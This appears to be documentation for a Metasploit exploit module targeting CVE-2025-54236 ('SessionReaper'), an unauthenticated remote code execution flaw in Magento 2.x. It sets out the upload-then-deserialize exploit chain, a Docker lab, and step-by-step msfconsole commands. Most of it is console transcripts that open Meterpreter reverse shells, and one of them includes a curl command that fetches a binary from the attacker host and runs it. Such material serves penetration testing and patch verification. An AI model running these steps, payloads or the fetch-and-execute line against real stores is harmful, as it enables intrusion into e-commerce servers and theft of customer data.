## Vulnerable Application

Magento/Adobe Commerce is a popular e-commerce platform written in PHP. A vulnerability exists in Magento 2.x that
allows an unauthenticated user to gain arbitrary code execution through nested deserialization and unauthenticated file
upload.

This vulnerability (CVE-2025-54236, also known as SessionReaper) affects Magento 2.x instances using file-based session
storage. The module was specifically tested against Magento 2.4.4.

### Description

This module exploits CVE-2025-54236 (SessionReaper) in Magento/Adobe Commerce. The vulnerability allows unauthenticated
remote code execution through nested deserialization and unauthenticated file upload.

The exploit chain:
1. Uploads a malicious session file via unauthenticated endpoint `/customer/address_file/upload`
2. Triggers deserialization by modifying session savePath via REST API endpoint
   `/rest/default/V1/guest-carts/{cart_id}/order`
3. Executes arbitrary PHP code

Patched versions return 400 Bad Request instead of processing the payload.

### Installation

#### Magento 2.4.4 with Docker

A lab environment is available in `test/magento/` directory.

1. Navigate to the test directory:
```bash
cd test/magento
```

2. Build and start the containers:
```bash
docker compose up -d --build
```

3. Wait for the services to be ready (MySQL and Elasticsearch). The entrypoint script will automatically:
   - Wait for MySQL and Elasticsearch to be ready
   - Download and install Magento 2.4.4
   - Configure file-based session storage
   - Set proper permissions

4. Access Magento:
   - Frontend: http://127.0.0.1:8082/
   - Admin: http://127.0.0.1:8082/admin/ (admin/Admin123!)

The lab uses:
- Magento 2.4.4 (vulnerable version)
- PHP 7.4
- MariaDB 10.4
- Elasticsearch 7.17.0

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/multi/http/magento_sessionreaper`
3. Do: `set RHOSTS <target_ip>`
4. Do: `set RPORT 8082` (or the appropriate port)
5. Do: `set TARGET 1` (for Unix/Linux Command Shell)
6. Do: `set payload cmd/linux/http/x64/meterpreter/reverse_tcp`
7. Do: `set LHOST <your_ip>`
8. Do: `set LPORT 4444`
9. Do: `run`
10. You should get a Meterpreter session

## Options

The module uses the standard HTTP client options:
- `RHOSTS`: The target host(s)
- `RPORT`: The target port (default: 80)
- `TARGETURI`: Base Magento directory path (default: /)

## Scenarios

### Target 0 - PHP In-Memory (Magento 2.4.4 on Docker)

```
msf > use exploit/multi/http/magento_sessionreaper
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/magento_sessionreaper) > set RHOSTS 172.21.0.1
RHOSTS => 172.21.0.1
msf exploit(multi/http/magento_sessionreaper) > set RPORT 8082
RPORT => 8082
msf exploit(multi/http/magento_sessionreaper) > set TARGET 0
TARGET => 0
msf exploit(multi/http/magento_sessionreaper) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/http/magento_sessionreaper) > set LHOST 172.21.0.1
LHOST => 172.21.0.1
msf exploit(multi/http/magento_sessionreaper) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/magento_sessionreaper) > set VERBOSE true
VERBOSE => true
msf exploit(multi/http/magento_sessionreaper) > run

[*] Started reverse TCP handler on 172.21.0.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target returned 500 error with SessionHandler
[*] Generating Guzzle/FW1 deserialization payload...
[*] Uploading session file with Guzzle payload...
[*] Uploading malicious session file: sess_73351c2463bf78124de49e6c5fe6804a
[*] Triggering deserialization with savePath: media/customer_address/s/e
[+] Deserialization triggered (HTTP 404)
[*] Executing payload at: /pub/AbfsP.php
[*] Sending stage (41224 bytes) to 172.21.0.4
[*] Meterpreter session 1 opened (172.21.0.1:4444 -> 172.21.0.4:60798) at 2025-11-24 20:55:44 +0100

meterpreter > sysinfo
Computer        : 93d562876bca
OS              : Linux 93d562876bca 6.14.0-115036-tuxedo #36~24.04.1tux1 SMP PREEMPT_DYNAMIC Mon Nov  3 17:34:07 UTC 2025 x86_64
Architecture    : x64
System Language : C
Meterpreter     : php/linux
meterpreter > exit
[*] Shutting down session: 1
[*] 172.21.0.1 - Meterpreter session 1 closed.  Reason: User exit
```

### Target 1 - Unix/Linux Command Shell (Magento 2.4.4 on Docker)

```
msf exploit(multi/http/magento_sessionreaper) > set TARGET 1
TARGET => 1
msf exploit(multi/http/magento_sessionreaper) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(multi/http/magento_sessionreaper) > set LHOST 172.21.0.1
LHOST => 172.21.0.1
msf exploit(multi/http/magento_sessionreaper) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/magento_sessionreaper) > set VERBOSE true
VERBOSE => true
msf exploit(multi/http/magento_sessionreaper) > run

[*] Command to run on remote host: curl -so ./tVLJyRtY http://172.21.0.1:8080/jA-UlkUXeCwJQV_LW9doGw;chmod +x ./tVLJyRtY;./tVLJyRtY&
[*] Fetch handler listening on 172.21.0.1:8080
[*] HTTP server started
[*] Adding resource /jA-UlkUXeCwJQV_LW9doGw
[*] Started reverse TCP handler on 172.21.0.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target returned 500 error with SessionHandler
[*] Generating Guzzle/FW1 deserialization payload...
[*] Uploading session file with Guzzle payload...
[*] Uploading malicious session file: sess_f96806648d613cac927613576dd37dc8
[*] Triggering deserialization with savePath: media/customer_address/s/e
[+] Deserialization triggered (HTTP 404)
[*] Executing payload at: /pub/AGD3.php
[*] Client 172.21.0.4 requested /jA-UlkUXeCwJQV_LW9doGw
[*] Sending payload to 172.21.0.4 (curl/7.74.0)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 172.21.0.4
[*] Meterpreter session 2 opened (172.21.0.1:4444 -> 172.21.0.4:47580) at 2025-11-24 20:56:19 +0100

meterpreter > sysinfo
Computer     : 172.21.0.4
OS           : Debian 11.5 (Linux 6.14.0-115036-tuxedo)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Check Command

```
msf exploit(multi/http/magento_sessionreaper) > check
[+] The target appears to be vulnerable. Target returned 500 error with SessionHandler
```

## References

- [CVE-2025-54236](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-54236)
- [Searchlight Cyber Blog - Why Nested Deserialization is Still Harmful: Magento RCE CVE-2025-54236]
  (https://www.searchlightcyber.com/blog/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236)
- [Adobe Security Bulletin](https://experienceleague.adobe.com/en/docs/experience-cloud-kcs/kbarticles/ka-27397)

